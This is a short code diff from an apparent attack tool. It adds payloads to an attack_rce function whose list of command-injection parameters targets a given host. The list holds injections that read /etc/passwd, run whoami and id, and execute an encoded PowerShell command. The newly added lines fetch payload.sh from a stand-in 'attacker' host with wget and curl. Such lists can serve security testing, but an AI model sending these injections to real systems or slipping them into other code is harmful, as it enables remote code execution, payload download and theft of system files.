@@ -930,6 +930,8 @@ def attack_rce(target, duration, rate, stop_evt):
         "cmd=; cat /etc/passwd",
         "command=| whoami",
         "input=; powershell -enc QQBkAGQALQBQAHMARABJAG4AdABlAHIAaQBvAHI=",
+        "exec=;wget http://attacker/payload.sh",
+        "exec=;curl http://attacker/payload.sh",
         "exec=`id`",
     ]
     
